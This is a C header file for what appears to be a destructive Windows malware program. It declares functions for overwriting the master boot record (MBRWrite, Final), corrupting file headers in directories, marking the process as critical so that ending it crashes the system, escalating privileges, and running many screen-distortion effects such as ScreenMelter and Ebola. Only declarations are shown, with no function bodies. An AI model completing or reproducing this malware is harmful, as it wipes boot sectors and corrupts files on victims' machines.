/* global headers */

#include <windows.h>
#include "config.h"

/* variable declarations */

#define IDICON 20
#define WCHAR_MAX 0xffff
#define M_PI 3.14159265358979323846
#define CARD(num) (num % 4) * 13 + (num/4)
#define RGB_RAND RGB(random() % 256, random() % 256, random() % 256) /* creates a random rgb value */
#define COMIC_SANS CreateFont(0, 0, 0, 0, FW_REGULAR, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, L"Comic Sans MS") /* Comic Sans Regular */

typedef struct METRICS {
	RECT dwd; /* desktop window dimensions */
	int dw; /* desktop width */
	int dh; /* desktop height */
	HWND dwh; /* desktop window handle */
} METRICS;

typedef NTSTATUS(NTAPI *pfRtlSetProcessIsCritical) (BOOLEAN bNew, BOOLEAN *pbOld, BOOLEAN bNeedScb);
typedef NTSTATUS(NTAPI *pfNtSetInformationProcess) (HANDLE ProcessHandle, DWORD ProcessInformationClass, void *ProcessInformation, ULONG ProcessInformationLength);

/* util.c */

int random();
DWORD LookupProcessID(LPCWSTR lpFilename);
int ProcessSetPrivilege(LPCWSTR lpPrivilegeName, DWORD dwAttributes);

/* masterbootrecord.c */

int Final();
int MBRWrite();

/* files.c */

int DirectoryCorruptHeaders(LPCWSTR lpDirectory);

/* critical.c */

int Critical_RtlSetProcessIsCritical();
int Critical_NtSetInformationProcess();
int PrivilegeEscalator();

/* windows.c */

int StyleFucker();
int WindowTrails();
int SetWindowIcon();
int ShowAllWindows();
int FlipWindowLeft();
int CircularWindows();
int FlipWindowRight();
int HideStartButton();
int SetAllWindowsText();
int AllWindowsCreateHole();
int CreateHoleAroundCursor();
int MoveAllWindows(LPARAM lParam);
BOOL CALLBACK WindowTextProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK ShowWindowProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK MoveWindowsProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK CreateWindowHoleProc(HWND hwnd, LPARAM lParam);

/* desktopiconpositioning.c */

HWND GetSysListView32();
int SetDesktopIconPositions(int x, int y);
BOOL CALLBACK GetSHELLDLL_DefView(HWND hwnd, LPARAM lParam);

/* messagebox.c */

int CustomMessageBoxIcon();
int CustomMessageBoxPosition();
int CustomMessageBoxButtonText();
LRESULT CALLBACK IconHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK ButtonHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK PositionHookProc(int nCode, WPARAM wParam, LPARAM lParam);

/* gdi.c */

DWORD WINAPI Ebola(LPVOID lParam);
DWORD WINAPI IconWorm(LPVOID lParam);
DWORD WINAPI Grayscale(LPVOID lParam);
DWORD WINAPI IncInvert(LPVOID lParam);
DWORD WINAPI RGBScreen(LPVOID lParam);
DWORD WINAPI SetPixels(LPVOID lParam);
DWORD WINAPI ColorMerge(LPVOID lParam);
DWORD WINAPI CursorDraw(LPVOID lParam);
DWORD WINAPI FlipScreen(LPVOID lParam);
DWORD WINAPI GreenScreen(LPVOID lParam);
DWORD WINAPI HatchScreen(LPVOID lParam);
DWORD WINAPI ScreenMelter(LPVOID lParam);
DWORD WINAPI SpiralScreen(LPVOID lParam);
DWORD WINAPI ComicSansText(LPVOID lParam);
DWORD WINAPI ExtrudeScreen(LPVOID lParam);
DWORD WINAPI GradientBlend(LPVOID lParam);
DWORD WINAPI SolitaireCards(LPVOID lParam);
DWORD WINAPI SaturationTunnel(LPVOID lParam);
DWORD WINAPI DesktopIconFollow(LPVOID lParam);
DWORD WINAPI FullScreenRepaint(LPVOID lParam);
LRESULT CALLBACK EbolaProc(HWND hwnd, UINT Msg, WPARAM wParam, LPARAM lParam);